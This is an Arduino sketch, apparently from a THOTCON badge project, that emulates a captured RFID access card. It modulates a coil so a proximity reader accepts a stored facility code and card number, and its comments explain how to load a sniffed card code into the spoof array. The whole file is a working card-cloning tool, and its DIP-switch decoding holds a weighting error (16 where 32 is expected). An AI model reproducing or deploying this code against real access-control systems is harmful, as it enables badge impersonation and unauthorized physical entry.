//The THOTCON06 RFID Snooper will output the card code as 0101 0101 0101 0101 0101 0101 0101 1010 1001 0101 0110 0100 1101 1001 0110 1001 0110 1010 1001 0110 1010 1010
//This includes the facility code and card number
//You need to add a preable of "00011101" and then put it all into the "data to spoof" array as shown.
unsigned char data_to_spoof[64][12] = {
  {0x1D, 0x55, 0x59, 0x9A, 0x66, 0xA5, 0x99, 0x59, 0x65, 0x99, 0x99, 0x56},
  {0x1D, 0x55, 0x59, 0x9A, 0x66, 0xA5, 0x99, 0x59, 0x65, 0x99, 0x99, 0x56},
  {0x1D, 0x55, 0x59, 0x9A, 0x66, 0xA5, 0x99, 0x59, 0x65, 0x99, 0x99, 0x56},
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  {0x1D, 0x55, 0x59, 0x9A, 0x66, 0xA5, 0x99, 0x59, 0x65, 0x99, 0x99, 0x56}
};

//Pin to connect to the circuit
//Setting the pin LOW will tune the coil
//meaning it will respond as a high signal to the reader
//Setting the pin to HIGH will detune coil
//meaning the reader will see it as a low signal
//You may need to change the coil pin if your circuit uses a different arduino data pin than D11


char dip_pin = 2;
char coil_pin = 11;
int counter;
int x;
unsigned char dip_setting;
long startmillis = 0;
long endmillis = 0;

void setup() {
  //Set pin as output
  pinMode(coil_pin, OUTPUT);
  //pinMode(dip_pin, INPUT_PULLUP);
  //pinMode(dip_pin + 1, INPUT_PULLUP);
  //pinMode(dip_pin + 2, INPUT_PULLUP);
  //pinMode(dip_pin + 3, INPUT_PULLUP);
  //pinMode(dip_pin + 4, INPUT_PULLUP);
  //pinMode(dip_pin + 5, INPUT_PULLUP);
    
  //Start it as low
  digitalWrite(coil_pin, LOW);
  Serial.begin(115200);

}

void loop() {
  dip_setting = digitalRead(dip_pin) + digitalRead(dip_pin + 1) * 2 + digitalRead(dip_pin + 2) * 4 + digitalRead(dip_pin + 3) * 8 + digitalRead(dip_pin + 4) * 16 + digitalRead(dip_pin + 5) * 16;
  
  //Serial.print(millis());
  //Serial.print(" ");
 
  for (int y=0; y<96;y++)
  { 
    unsigned char temp2 = y % 8;
    unsigned char temp = data_to_spoof[dip_setting][y/8];
    unsigned char mask = 0x01;
    mask = mask << (7-temp2);
    //Serial.print(y);
    //Serial.print(' ');
    if(temp & mask){
      Serial.print('1');
    }
    else{
      Serial.print('0');
    }
    
    if (temp & mask)
    {
      for (int x = 0; x < 5; x++)
      {
          PORTB = B0000;
          for (counter=0; counter < 87; counter++)
          {
            __asm__("nop\n\t");
          }
          PORTB = B1000;
          for (counter=0; counter < 85; counter++)
          {
            __asm__("nop\n\t");
          }
      }
    }
    else
    {
      for (int x = 0; x < 7; x++)
      {
          PORTB = B0000;
          for (counter=0; counter < 63; counter++)
          {
            __asm__("nop\n\t");
          }
          PORTB = B1000;
          for (counter=0; counter < 61; counter++)
          {
            __asm__("nop\n\t");
          }
      }
    }
  }
  Serial.println();
  //Serial.println(millis());
}
